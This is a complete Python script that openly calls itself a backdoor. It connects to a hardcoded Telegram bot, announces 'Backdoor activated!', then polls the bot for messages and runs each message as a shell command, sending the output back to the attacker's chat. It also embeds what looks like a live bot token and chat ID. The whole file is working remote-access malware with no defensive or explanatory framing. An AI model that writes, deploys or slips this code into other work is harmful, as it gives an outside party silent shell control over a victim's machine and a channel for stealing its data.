import requests
import subprocess
import time

TOKEN = "7812032063:AAHcpDZge7GoAFkgzVXMncdlyXn3eAX2A18"
CHAT_ID = "249127714"
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

def send_message(text):
    try:
        requests.post(
            f"{BASE_URL}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "Markdown"
            },
            timeout=5
        )
    except Exception as e:
        print(f"Send error: {e}")

def get_updates():
    try:
        response = requests.get(f"{BASE_URL}/getUpdates?timeout=10").json()
        return response.get("result", [])
    except:
        return []

def main():
    last_update_id = 0
    send_message("🚀 Backdoor activated!")
    
    while True:
        updates = get_updates()
        if updates:
            for update in updates:
                update_id = update["update_id"]
                if update_id > last_update_id:
                    last_update_id = update_id
                    message = update.get("message", {})
                    if "text" in message:
                        cmd = message["text"]
                        if cmd.lower() == "exit":
                            send_message("🔴 Session ended")
                            return
                        try:
                            output = subprocess.getoutput(cmd)
                            send_message(f"`{output}`")
                        except Exception as e:
                            send_message(f"Error: {str(e)}")
        time.sleep(2)

if __name__ == "__main__":
    main()
